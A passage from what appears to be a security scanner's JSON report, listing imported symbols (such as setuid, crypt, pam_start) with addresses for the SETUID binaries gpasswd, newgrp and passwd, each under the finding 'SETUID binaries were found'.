                        "0x00014f28",
                        "ulckpwdf",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014f30",
                        "perror",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014f38",
                        "rename",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014f40",
                        "strtoul",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014f48",
                        "__cxa_atexit",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014f50",
                        "openlog",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014f58",
                        "freecon",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014f60",
                        "link",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014f68",
                        "exit",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014f70",
                        "__fprintf_chk",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014f78",
                        "audit_log_user_message",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014f80",
                        "__strncat_chk",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014f88",
                        "audit_log_acct_message",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014f90",
                        "setuid",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014f98",
                        "strdup",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014fa0",
                        "strerror",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014fa8",
                        "crypt",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014fb0",
                        "sleep",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014fb8",
                        "getc",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014fc0",
                        "putgrent",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014fc8",
                        "fork",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014fd0",
                        "__ctype_b_loc",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014fd8",
                        "_ITM_deregisterTMCloneTable",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014fe0",
                        "__libc_start_main",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014fe8",
                        "__gmon_start__",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014ff0",
                        "_ITM_registerTMCloneTable",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014ff8",
                        "__cxa_finalize",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00016080",
                        "stdout",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00016090",
                        "stdin",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00016098",
                        "optind",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x000160a0",
                        "__environ",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x000160a8",
                        "optarg",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x000160c0",
                        "stderr",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x00000000",
                        "__cxa_finalize",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x00006b30",
                        "setsgent",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x00006b70",
                        "endsgent",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x00006bb0",
                        "sgetsgent",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x00006d60",
                        "fgetsgent",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x00006ed0",
                        "getsgent",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x00006f10",
                        "getsgnam",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x00006f50",
                        "putsgent",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000ad40",
                        "endgrent",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000ad48",
                        "getenv",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000ad50",
                        "__snprintf_chk",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000ad58",
                        "free",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000ad60",
                        "strcasecmp",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000ad68",
                        "closelog",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000ad70",
                        "endspent",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000ad78",
                        "__errno_location",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000ad80",
                        "strncpy",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000ad88",
                        "strncmp",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000ad90",
                        "strcpy",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000ad98",
                        "getgrent",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000ada0",
                        "ferror",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000ada8",
                        "getpid",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000adb0",
                        "textdomain",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000adb8",
                        "fclose",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000adc0",
                        "getspnam_r",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000adc8",
                        "bindtextdomain",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000add0",
                        "stpcpy",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000add8",
                        "dcgettext",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000ade0",
                        "strlen",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000ade8",
                        "getpwuid_r",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000adf0",
                        "chdir",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000adf8",
                        "__stack_chk_fail",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000ae00",
                        "getuid",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000ae08",
                        "strchr",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000ae10",
                        "rewind",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000ae18",
                        "setgrent",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000ae20",
                        "getgrgid",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000ae28",
                        "audit_open",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000ae30",
                        "strrchr",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000ae38",
                        "__assert_fail",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000ae40",
                        "fputs",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000ae48",
                        "memset",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000ae50",
                        "setgroups",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000ae58",
                        "strspn",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000ae60",
                        "strcspn",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000ae68",
                        "fgets",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000ae70",
                        "calloc",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000ae78",
                        "strcmp",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000ae80",
                        "putc",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000ae88",
                        "signal",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000ae90",
                        "feof",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000ae98",
                        "strtol",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000aea0",
                        "memcpy",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000aea8",
                        "getgrnam",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000aeb0",
                        "kill",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000aeb8",
                        "getgid",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000aec0",
                        "getgroups",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000aec8",
                        "malloc",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000aed0",
                        "endpwent",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000aed8",
                        "getlogin",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000aee0",
                        "__strncpy_chk",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000aee8",
                        "ttyname",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000aef0",
                        "realloc",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000aef8",
                        "getgrgid_r",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000af00",
                        "getpwnam_r",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000af08",
                        "setlocale",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000af10",
                        "__printf_chk",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000af18",
                        "__syslog_chk",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000af20",
                        "setgid",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000af28",
                        "waitpid",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000af30",
                        "getpass",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000af38",
                        "access",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000af40",
                        "fopen",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000af48",
                        "perror",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000af50",
                        "sysconf",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000af58",
                        "strtoul",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000af60",
                        "openlog",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000af68",
                        "getgrnam_r",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000af70",
                        "exit",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000af78",
                        "execle",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000af80",
                        "__fprintf_chk",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000af88",
                        "audit_log_user_message",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000af90",
                        "audit_log_acct_message",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000af98",
                        "setuid",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000afa0",
                        "strdup",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000afa8",
                        "strerror",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000afb0",
                        "execl",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000afb8",
                        "crypt",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000afc0",
                        "sleep",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000afc8",
                        "fork",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000afd0",
                        "__ctype_b_loc",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000afd8",
                        "_ITM_deregisterTMCloneTable",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000afe0",
                        "__libc_start_main",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000afe8",
                        "__gmon_start__",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000aff0",
                        "_ITM_registerTMCloneTable",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000aff8",
                        "__cxa_finalize",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000b5e0",
                        "__environ",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000b600",
                        "stderr",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x00000000",
                        "__cxa_finalize",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x000032d0",
                        "fputs",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x00003370",
                        "fgets",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ec18",
                        "utime",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ec20",
                        "__snprintf_chk",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ec28",
                        "free",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ec30",
                        "is_selinux_enabled",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ec38",
                        "strcasecmp",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ec40",
                        "closelog",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ec48",
                        "pam_start",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ec50",
                        "__errno_location",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ec58",
                        "unlink",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ec60",
                        "strncpy",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ec68",
                        "strncmp",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ec70",
                        "strcpy",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ec78",
                        "chroot",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ec80",
                        "sgetspent",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ec88",
                        "putspent",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ec90",
                        "ferror",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ec98",
                        "lckpwdf",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000eca0",
                        "qsort",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000eca8",
                        "selinux_check_access",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ecb0",
                        "fcntl",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ecb8",
                        "write",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ecc0",
                        "getpid",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ecc8",
                        "textdomain",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ecd0",
                        "__open_2",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ecd8",
                        "fclose",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ece0",
                        "bindtextdomain",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ece8",
                        "pam_chauthtok",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ecf0",
                        "dcgettext",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ecf8",
                        "strlen",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ed00",
                        "__lxstat",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ed08",
                        "getpwuid_r",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ed10",
                        "pam_end",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ed18",
                        "chdir",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ed20",
                        "__stack_chk_fail",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ed28",
                        "getuid",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ed30",
                        "getopt_long",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ed38",
                        "pam_strerror",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ed40",
                        "strchr",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ed48",
                        "snprintf",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ed50",
                        "audit_open",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ed58",
                        "strrchr",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ed60",
                        "__assert_fail",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ed68",
                        "fputs",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ed70",
                        "memset",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ed78",
                        "geteuid",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ed80",
                        "selinux_set_callback",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ed88",
                        "close",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ed90",
                        "strspn",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ed98",
                        "matchpathcon",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000eda0",
                        "fputc",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000eda8",
                        "strcspn",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000edb0",
                        "read",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000edb8",
                        "fgets",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000edc0",
                        "execve",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000edc8",
                        "calloc",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000edd0",
                        "strcmp",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000edd8",
                        "putc",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ede0",
                        "signal",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ede8",
                        "strtoll",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000edf0",
                        "setpwent",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000edf8",
                        "__memcpy_chk",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ee00",
                        "getprevcon",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ee08",
                        "feof",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ee10",
                        "umask",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ee18",
                        "strtol",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ee20",
                        "realpath",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ee28",
                        "getgrnam",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ee30",
                        "getpwent",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ee38",
                        "kill",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ee40",
                        "fileno",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ee48",
                        "getgid",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ee50",
                        "__xstat",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ee58",
                        "setfscreatecon",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ee60",
                        "malloc",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ee68",
                        "fflush",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ee70",
                        "__vasprintf_chk",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ee78",
                        "__fxstat",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ee80",
                        "endpwent",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ee88",
                        "getlogin",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ee90",
                        "fseek",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ee98",
                        "security_getenforce",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000eea0",
                        "__fgets_chk",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000eea8",
                        "__strncpy_chk",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000eeb0",
                        "setrlimit",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000eeb8",
                        "setreuid",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000eec0",
                        "setregid",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000eec8",
                        "realloc",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000eed0",
                        "fdopen",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000eed8",
                        "getpwnam_r",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000eee0",
                        "setlocale",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000eee8",
                        "__printf_chk",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000eef0",
                        "fchmod",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000eef8",
                        "strftime",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ef00",
                        "__syslog_chk",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ef08",
                        "fsync",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ef10",
                        "waitpid",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ef18",
                        "getspnam",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ef20",
                        "open",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ef28",
                        "access",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ef30",
                        "fchown",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ef38",
                        "audit_log_user_avc_message",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ef40",
                        "fopen",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ef48",
                        "ulckpwdf",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ef50",
                        "perror",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ef58",
                        "rename",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ef60",
                        "gmtime",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ef68",
                        "strtoul",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ef70",
                        "openlog",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ef78",
                        "freecon",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ef80",
                        "link",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ef88",
                        "exit",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ef90",
                        "__fprintf_chk",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ef98",
                        "setuid",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000efa0",
                        "strdup",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000efa8",
                        "putpwent",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000efb0",
                        "strerror",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000efb8",
                        "sleep",
                        "SETUID binaries were found"
